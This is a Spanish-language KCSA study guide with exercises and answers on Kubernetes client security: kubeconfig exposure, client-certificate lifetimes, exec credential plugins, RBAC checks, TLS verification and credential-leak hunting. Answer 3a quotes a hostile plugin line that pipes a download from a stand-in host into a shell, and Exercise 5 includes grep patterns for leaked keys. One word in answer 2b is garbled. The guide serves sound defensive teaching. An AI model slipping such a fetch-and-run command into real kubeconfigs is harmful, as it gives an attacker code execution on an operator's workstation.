# Ejercicios Guiados — Tema 2.10: Client Security (KCSA)

> **Contexto del tema.** En el dominio *Kubernetes Cluster Component Security* del KCSA, "Client Security" no trata de securizar el cluster desde afuera, sino de securizar **el lado del cliente**: el binario `kubectl`, el archivo `kubeconfig`, las credenciales que este contiene (certificados, tokens, exec-plugins) y la superficie de ataque que un cliente comprometido abre sobre el `kube-apiserver`. Un `kubeconfig` filtrado es acceso directo al plano de control; un exec-plugin malicioso es ejecución de código arbitrario en la estación del operador.
>
> **Requisitos.** Un cluster de práctica (kind, minikube o cualquiera de laboratorio), `kubectl` instalado, `openssl` y `base64` disponibles. **No ejecutes estos comandos contra un cluster de producción con tu identidad de administrador** salvo los que son de solo lectura, y nunca subas tu `kubeconfig` real a ningún lado.

---

## Ejercicio 1 — Anatomía y superficie de exposición del `kubeconfig`

El `kubeconfig` es el punto único donde convergen *a qué cluster* te conectás, *cómo verificás* su identidad (CA) y *quién sos vos* (credencial). Entender su estructura es entender qué se filtra cuando se filtra.

**Pasos:**

1. Mirá la vista "segura" (redactada) que `kubectl` muestra por defecto:

   ```bash
   kubectl config view
   ```

   Fijate en las líneas de credenciales:

   ```yaml
   users:
   - name: kind-lab
     user:
       client-certificate-data: DATA+OMITTED
       client-key-data: DATA+OMITTED
   ```

2. Ahora mirá la vista **cruda**, que NO redacta nada:

   ```bash
   kubectl config view --raw | head -30
   ```

   Observá que `DATA+OMITTED` se convierte en el material real en base64.

3. Enumerá contextos, clusters y usuarios definidos, y cuál está activo:

   ```bash
   kubectl config get-contexts
   kubectl config current-context
   ```

   Salida típica:

   ```
   CURRENT   NAME       CLUSTER    AUTHINFO   NAMESPACE
   *         kind-lab   kind-lab   kind-lab   default
   ```

4. Verificá permisos y ubicación del archivo en disco:

   ```bash
   echo "${KUBECONFIG:-$HOME/.kube/config}"
   ls -l "$HOME/.kube/config"
   stat -c '%a %U %n' "$HOME/.kube/config"
   ```

   Un archivo correctamente securizado responde `600 <tu-usuario> /home/.../.kube/config`.

5. Comprobá la precedencia de la variable de entorno frente al archivo por defecto:

   ```bash
   KUBECONFIG=/tmp/no-existe.yaml kubectl config current-context
   ```

   Salida esperada:

   ```
   error: current-context is not set
   ```

**Preguntas de comprensión:**

- **1a.** ¿Por qué `kubectl config view` muestra `DATA+OMITTED` y `REDACTED`, y qué falsa sensación de seguridad puede generar frente a `--raw`?
- **1b.** Un `kubeconfig` con permisos `644` en una máquina multiusuario, ¿qué expone y a quién? ¿Alcanza con `chmod 600`?
- **1c.** Si tenés `export KUBECONFIG=/proyecto/prod.yaml` en tu `.bashrc` y además existe `~/.kube/config`, ¿contra qué cluster actúa `kubectl delete ns` sin flags? Explicá la regla de precedencia.

---

## Ejercicio 2 — Diseccionar la credencial: certificados de cliente y su expiración

La autenticación por certificado de cliente es la default de muchos instaladores (kubeadm, kind). Su gran trampa de seguridad: **Kubernetes no soporta revocación de certificados** (no hay CRL ni OCSP en el apiserver). Un certificado filtrado es válido hasta que expira. Por eso la mitigación es *vida corta*, no *revocación*.

**Pasos:**

1. Extraé el certificado de cliente del `kubeconfig` y decodificalo:

   ```bash
   kubectl config view --raw \
     -o jsonpath='{.users[0].user.client-certificate-data}' \
     | base64 -d | openssl x509 -noout -subject -issuer -dates
   ```

   Salida ilustrativa:

   ```
   subject=O=kubeadm:cluster-admins, CN=kubernetes-admin
   issuer=CN=kubernetes
   notBefore=Aug  1 10:00:00 2026 GMT
   notAfter=Aug  1 10:00:00 2027 GMT
   ```

2. Interpretá el mapeo de identidad. En Kubernetes, para un certificado de cliente:
   - **`CN` (Common Name) → username**
   - **`O` (Organization) → group** (puede haber varios `O`)

   Confirmalo pidiéndole al apiserver quién cree que sos (necesita cluster 1.27+):

   ```bash
   kubectl auth whoami
   ```

   ```
   ATTRIBUTE   VALUE
   Username    kubernetes-admin
   Groups      [kubeadm:cluster-admins system:authenticated]
   ```

3. Calculá cuánto le queda de vida a la credencial:

   ```bash
   kubectl config view --raw \
     -o jsonpath='{.users[0].user.client-certificate-data}' \
     | base64 -d | openssl x509 -noout -checkend 0 && echo "VIGENTE" || echo "EXPIRADO"
   ```

4. Reflexioná sobre el `O=kubeadm:cluster-admins`: ese grupo está ligado por un `ClusterRoleBinding` al `ClusterRole/cluster-admin`. Verificá el poder real de esa credencial:

   ```bash
   kubectl auth can-i '*' '*' --all-namespaces
   ```

   Un `yes` significa que quien tenga ese ~1.5 KB de base64 es dueño del cluster.

**Preguntas de comprensión:**

- **2a.** Un desarrollador rota su clave privada porque sospecha que se filtró el certificado. ¿Por qué esto NO invalida al certificado robado, y cuál es la única defensa real que le queda al operador del cluster?
- **2b.** Un atacante consigue un `client-certificate-data` con `subject=O=system:masters, CN=hacker`. ¿Por qué es catastrófico independientemente de qué RBAC hayas escrito? (Pista: pensá en el binding built-in de `system:masters`.)
- **2c.** ¿Qué ventaja de seguridad concreta tienen los ServiceAccount tokens *bound* (proyectados, con `expirationSeconds`) frente a estos certificados de cliente de larga vida?

---

## Ejercicio 3 — Exec credential plugins: el cliente que ejecuta binarios

Los `kubeconfig` modernos (EKS, GKE, AKS, OIDC) casi nunca guardan una credencial estática: invocan un **exec credential plugin** (`client.authentication.k8s.io/v1beta1`) que produce un token efímero en cada llamada. Es más seguro *porque* no persiste secretos… pero introduce un vector nuevo: **`kubectl` ejecuta un binario arbitrario definido dentro del `kubeconfig`**. Un `kubeconfig` no confiable = ejecución de código.

**Pasos:**

1. Observá cómo luce un bloque `exec` real (podés ver uno en un `kubeconfig` de EKS/GKE o construir el de laboratorio de abajo):

   ```yaml
   users:
   - name: eks-prod
     user:
       exec:
         apiVersion: client.authentication.k8s.io/v1beta1
         command: aws
         args:
           - --region
           - us-east-1
           - eks
           - get-token
           - --cluster-name
           - prod
         env:
           - name: AWS_PROFILE
             value: prod
         interactiveMode: IfAvailable
   ```

2. Simulá el mecanismo con un plugin trivial para *ver el peligro*. Creá un script que representa el binario invocado:

   ```bash
   cat > /tmp/fake-plugin.sh <<'EOF'
   #!/usr/bin/env bash
   # En un ataque real, aquí iría la carga maliciosa ANTES de devolver el token.
   echo "[!] Este código se ejecutó con TUS privilegios de shell" >&2
   cat <<JSON
   {"apiVersion":"client.authentication.k8s.io/v1beta1","kind":"ExecCredential","status":{"token":"fake-token"}}
   JSON
   EOF
   chmod +x /tmp/fake-plugin.sh
   ```

3. Leé, **sin ejecutar**, un `kubeconfig` recibido de un tercero para descubrir qué binarios invocaría:

   ```bash
   kubectl config view --raw -o jsonpath='{range .users[*]}{.name}{"\t"}{.user.exec.command}{"\n"}{end}'
   ```

   Este es el paso de higiene: **auditar `command` y `args` antes de que `kubectl` los corra**.

4. Compará el modelo de confianza: un token estático en el `kubeconfig` es un *secreto que se filtra*; un exec-plugin es un *comando que se ejecuta*. Ambos son sensibles, pero por razones distintas.

**Preguntas de comprensión:**

- **3a.** Un colega te pasa un `kubeconfig` por Slack "para que veas el cluster de staging". ¿Qué revisás **antes** de escribir tu primer `kubectl get pods`, y por qué el riesgo excede al del cluster de staging?
- **3b.** ¿Por qué un exec credential plugin (p. ej. `aws eks get-token`) es *más* seguro que pegar un token estático en el `kubeconfig`, en términos de vida útil y persistencia de la credencial?
- **3c.** ¿El campo `interactiveMode: Never` mejora o empeora la seguridad frente a un plugin que necesita pedir un MFA? Explicá el trade-off entre automatización y verificación humana.

---

## Ejercicio 4 — Verificar los privilegios efectivos del cliente (RBAC desde el lado cliente)

Un cliente securizado es un cliente con **el mínimo privilegio**. Antes de confiar en que "el RBAC está bien", el operador comprueba empíricamente qué puede hacer *esta* credencial.

**Pasos:**

1. Enumerá todo lo que tu identidad actual puede hacer:

   ```bash
   kubectl auth can-i --list
   ```

   Salida (recortada):

   ```
   Resources    Non-Resource URLs   Resource Names   Verbs
   *.*          []                  []               [*]
   ```

2. Hacé preguntas puntuales (útiles en scripts de verificación):

   ```bash
   kubectl auth can-i create pods -n kube-system
   kubectl auth can-i delete nodes
   kubectl auth can-i '*' secrets --all-namespaces
   ```

3. Probá la técnica de **impersonación** para auditar los permisos de *otra* identidad sin usar su credencial (requiere que vos tengas el verbo `impersonate`):

   ```bash
   kubectl auth can-i list secrets \
     --as=system:serviceaccount:default:build-bot \
     -n default
   ```

4. Creá una identidad de laboratorio de mínimo privilegio y contrastá. Generá un ServiceAccount y un `kubeconfig` acotado:

   ```bash
   kubectl create serviceaccount viewer -n default
   kubectl create rolebinding viewer-ro \
     --clusterrole=view --serviceaccount=default:viewer -n default

   TOKEN=$(kubectl create token viewer -n default --duration=15m)
   kubectl auth can-i create deployments -n default --token="$TOKEN"   # -> no
   kubectl auth can-i get pods -n default --token="$TOKEN"             # -> yes
   ```

   Fijate en `--duration=15m`: token **bound y efímero**, el opuesto seguro del certificado de larga vida del Ejercicio 2.

**Preguntas de comprensión:**

- **4a.** `kubectl auth can-i create pods` devuelve `yes`. ¿Por qué esto puede implicar, indirectamente, capacidad de *escalar a cualquier ServiceAccount del namespace*, y qué principio de RBAC lo explica?
- **4b.** ¿Para qué sirve `--as` (impersonación) en una auditoría de seguridad del lado cliente, y por qué el permiso `impersonate` es en sí mismo equivalente a escalada de privilegios?
- **4c.** Compará, en términos de superficie de filtración, un `kubeconfig` con un token de 15 minutos (`kubectl create token --duration=15m`) contra uno con un ServiceAccount token estático montado desde un `Secret`. ¿Cuál preferís y por qué?

---

## Ejercicio 5 — Endurecer el transporte y detectar fugas de credenciales

El último eslabón: aunque la credencial sea de vida corta, si el canal no verifica la CA del servidor sos vulnerable a MITM, y si la credencial termina en un log, historial o repo git, la vida corta no te salva del robo dentro de esa ventana.

**Pasos:**

1. Detectá el anti-patrón `insecure-skip-tls-verify` en cualquier `kubeconfig`:

   ```bash
   kubectl config view --raw -o jsonpath='{range .clusters[*]}{.name}{"\t"}{.cluster.insecure-skip-tls-verify}{"\n"}{end}'
   ```

   Cualquier cluster con `true` acepta *cualquier* certificado de servidor: un atacante en la red puede hacerse pasar por el apiserver y capturar tu credencial en el primer request.

2. Confirmá que estás verificando contra una CA real (lo correcto):

   ```bash
   kubectl config view --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' \
     | base64 -d | openssl x509 -noout -subject -issuer
   ```

3. Buscá fugas de credenciales en tu propio entorno (higiene del operador):

   ```bash
   # Tokens/kubeconfig pegados en el historial de shell
   grep -nE 'client-key-data|token:|BEGIN.*PRIVATE KEY' ~/.bash_history 2>/dev/null

   # Credenciales de Kubernetes commiteadas por error en un repo
   git log -p --all 2>/dev/null | grep -nE 'client-key-data|kind: Config' | head
   ```

4. Verificá la **version skew** de tu cliente: un `kubectl` demasiado adelantado o atrasado respecto del apiserver puede comportarse de forma inesperada. La política soportada es ±1 minor version.

   ```bash
   kubectl version -o json | \
     jq -r '"client=\(.clientVersion.gitVersion)  server=\(.serverVersion.gitVersion)"'
   ```

5. Verificá la **procedencia** del binario `kubectl` antes de confiar en él (defensa de supply chain del cliente):

   ```bash
   which kubectl
   sha256sum "$(which kubectl)"
   # Comparar contra el checksum oficial publicado:
   #   curl -L "https://dl.k8s.io/release/$(kubectl version -o json | jq -r .clientVersion.gitVersion)/bin/linux/amd64/kubectl.sha256"
   ```

**Preguntas de comprensión:**

- **5a.** Con `insecure-skip-tls-verify: true`, ¿por qué la vida corta de un exec-plugin token NO te protege? Describí el ataque MITM paso a paso.
- **5b.** ¿Por qué un `kubeconfig` en un repositorio git es *más* peligroso que uno en disco con `chmod 600`, incluso si borrás el archivo después? (Pensá en el modelo de historial de git.)
- **5c.** Un plugin de `krew` (gestor de plugins de `kubectl`) se ejecuta con tu identidad de shell y ve tu `kubeconfig`. ¿Qué controla el riesgo de supply chain de instalar plugins de terceros, y por qué el Ejercicio 3 es el mismo problema con otra cara?

---

## Respuestas

<details>
<summary>Ver soluciones y explicaciones</summary>

### Ejercicio 1

**1a.** `kubectl config view` reemplaza el material sensible por `DATA+OMITTED` (para `*-data`) y `REDACTED` (para tokens/passwords) *solo en la salida*, para que puedas pegar la configuración en un ticket sin filtrar la credencial. La falsa sensación de seguridad: **el secreto sigue estando en el archivo en claro (base64, que no es cifrado)**. `--raw` lo demuestra. La redacción es una cortesía de la CLI, no una protección del dato en reposo; quien lee el archivo `~/.kube/config` tiene la credencial completa.

**1b.** Con `644`, cualquier usuario local del sistema puede leer tu `~/.kube/config` y, con él, tu certificado/clave o token — es decir, tu identidad completa contra el apiserver, incluyendo la CA con la que confiás. En una máquina compartida (bastion, jump host) eso es toma de control del cluster con tus privilegios. `chmod 600` es necesario pero no suficiente: también importan los permisos del *directorio* (`~/.kube` debería ser `700`) y que la credencial subyacente sea de vida corta.

**1c.** Actúa contra `/proyecto/prod.yaml`. La regla de precedencia de `kubectl` es: (1) el flag `--kubeconfig` si está presente; (2) la variable de entorno `KUBECONFIG` (que además puede listar varios archivos separados por `:`, mergeados); (3) recién si nada de lo anterior existe, `~/.kube/config`. Como `KUBECONFIG` está seteada, `~/.kube/config` se ignora por completo — un clásico "creí que estaba en dev" que termina en `delete ns` sobre producción.

### Ejercicio 2

**2a.** Rotar la clave privada solo genera una credencial *nueva*; el certificado robado sigue firmado por la CA del cluster y **Kubernetes no consulta ninguna lista de revocación (CRL) ni OCSP** al validar certificados de cliente. Por lo tanto el certificado robado es válido hasta su `notAfter`. La única defensa real: emitir certificados de **vida corta** (para reducir la ventana), y si ya se filtró uno de larga vida, **rotar la CA del cluster** — operación disruptiva que invalida *todos* los certificados firmados por ella. Por eso la comunidad empuja hacia tokens bound y OIDC en lugar de client certs.

**2b.** El grupo `system:masters` está ligado, mediante un `ClusterRoleBinding` **built-in e inmutable** (`cluster-admin`), a permisos totales, y esa autorización se evalúa *antes* de que tu RBAC personalizado importe. Un certificado con `O=system:masters` es superusuario del cluster sin pasar por ninguna regla que hayas escrito; ni siquiera podés quitarle permisos con RBAC. Es exactamente por esto que nunca hay que emitir certificados con esa organización salоблоwe de break-glass extremos.

**2c.** Los ServiceAccount tokens proyectados/bound son **JWT firmados con expiración corta** (`expirationSeconds`), **ligados a un objeto** (audiencia, y opcionalmente al Pod) y **el apiserver los deja de aceptar cuando el SA o el Pod dejan de existir**. Es decir: expiran solos, tienen audiencia acotada y son efectivamente "revocables" borrando el sujeto — las tres propiedades que a los client certs de larga vida les faltan.

### Ejercicio 3

**3a.** Antes de cualquier comando, inspeccionás el bloque `exec` de cada usuario (`command`, `args`, `env`) — paso 3 del ejercicio — porque **`kubectl` ejecuta ese `command` en tu shell, con tus privilegios, en la primera llamada al apiserver**. Un `kubeconfig` hostil puede definir `command: /bin/sh -c 'curl evil|sh'`. El riesgo excede a staging: no es acceso al cluster de staging, es **ejecución de código arbitrario en tu estación de trabajo**, que probablemente tiene *otros* `kubeconfig` (prod), llaves SSH y secretos.

**3b.** Un token estático pegado en el `kubeconfig` es un secreto de larga vida que persiste en disco: si el archivo se filtra, el atacante tiene un token válido por mucho tiempo. El exec-plugin **no guarda ningún secreto en el `kubeconfig`**: genera un token efímero (minutos) en cada invocación a partir de una credencial base (perfil AWS/gcloud, ya protegida por su propio mecanismo). Menor vida útil + ninguna persistencia del token = mucha menor ventana y superficie de filtración.

**3c.** `interactiveMode: Never` mejora la automatización (funciona en CI/CD sin TTY) pero **empeora la verificación humana**: si el plugin necesitaba pedir MFA o una confirmación interactiva, con `Never` no puede, así que o falla o depende de credenciales ya presentes sin segundo factor. El trade-off: `IfAvailable`/`Always` permiten insertar un humano/MFA en el loop (más seguro, menos automatizable); `Never` es para procesos desatendidos donde la credencial base ya debe estar fuertemente protegida por otros medios.

### Ejercicio 4

**4a.** `create pods` implica poder crear un Pod que **monte el token de cualquier ServiceAccount del namespace** (vía `spec.serviceAccountName`) y que ejecute un contenedor que lea ese token proyectado. Si en el namespace hay un SA más privilegiado, creás un Pod con ese SA y heredás sus permisos: escalada. El principio: en RBAC, **`create pods` es equivalente a "actuar como cualquier ServiceAccount del namespace"** — por eso es un permiso peligroso que suele restringirse o mediarse con Pod Security Admission / políticas.

**4b.** `--as` (y `--as-group`) le pide al apiserver que evalúe la autorización *como si fueras* otra identidad, sin necesitar su credencial — ideal para auditar "¿qué puede hacer realmente el SA `build-bot`?". Pero el verbo `impersonate` es, por sí mismo, escalada: quien puede impersonar a `system:masters` o a un SA privilegiado obtiene todos sus permisos. Por eso `impersonate` debe concederse con el mismo cuidado que `cluster-admin`.

**4c.** El token de 15 minutos gana claramente. Un token estático montado desde un `Secret` es de larga vida, persiste en etcd, y si se filtra sirve indefinidamente hasta que alguien borre y rote el Secret manualmente. El `kubectl create token --duration=15m` es **bound y efímero**: expira solo, minimizando la ventana de abuso si el `kubeconfig` se filtra. Se prefiere siempre la credencial de vida corta; los tokens estáticos de SA son un anti-patrón que las versiones modernas de Kubernetes ya no montan por defecto.

### Ejercicio 5

**5a.** Con `insecure-skip-tls-verify: true`, `kubectl` **no valida el certificado del servidor contra la CA**, así que acepta a cualquiera que responda en esa IP/puerto. Ataque: (1) el atacante se posiciona en la red (ARP spoofing, DNS hijack, WiFi hostil); (2) intercepta tu conexión al "apiserver"; (3) presenta su propio certificado, que tu cliente acepta ciegamente; (4) tu cliente le entrega la credencial (o el token recién generado por el exec-plugin) en el header `Authorization` del primer request. La vida corta no ayuda: **el atacante roba el token dentro de su ventana de validez y lo usa de inmediato** contra el apiserver real. La verificación de CA es lo que impide entregarle la credencial al impostor.

**5b.** Git guarda **historial inmutable**: hacer `git rm` del `kubeconfig` en un commit posterior no lo borra de la historia — sigue recuperable con `git log -p --all` o `git checkout <sha>`. Además, si el repo se pushd a un remoto (GitHub, etc.), la credencial ya se replicó fuera de tu control y puede estar en clones, forks y caches. Un archivo local con `chmod 600` está en un solo lugar bajo tu control; un secreto commiteado se propagó y es prácticamente imposible de "des-filtrar". La única remediación real es **rotar/revocar la credencial**, no borrar el archivo.

**5c.** El riesgo se controla instalando plugins **solo desde fuentes confiables y verificadas** (el índice oficial de krew, checksums firmados), revisando qué hace el plugin antes de instalarlo, y ejecutando operaciones sensibles con el mínimo privilegio. Es el mismo problema del Ejercicio 3 con otra cara: en ambos casos **`kubectl` ejecuta código de terceros con tu identidad de shell y acceso a tu `kubeconfig`** — sea el `command` de un exec-plugin o el binario de un plugin de krew. La confianza en el binario del cliente y en todo lo que este ejecuta es parte integral de la "Client Security".

</details>

---

### Fuentes oficiales

- CNCF — *KCSA Curriculum* (dominio *Kubernetes Cluster Component Security → Client Security*): https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf
- Kubernetes — *Organizing Cluster Access Using kubeconfig Files*: https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/
- Kubernetes — *Authenticating* (client certs, bearer tokens, exec credential plugins): https://kubernetes.io/docs/reference/access-authn-authz/authentication/
- Kubernetes — *client-go credential plugins* (`client.authentication.k8s.io`): https://kubernetes.io/docs/reference/access-authn-authz/authentication/#client-go-credential-plugins
- Kubernetes — *Using RBAC Authorization* y `kubectl auth can-i` / impersonation: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- Kubernetes — *Service Account token volume projection* (tokens bound/efímeros): https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
- Kubernetes — *Version Skew Policy* (`kubectl` ±1 minor): https://kubernetes.io/releases/version-skew-policy/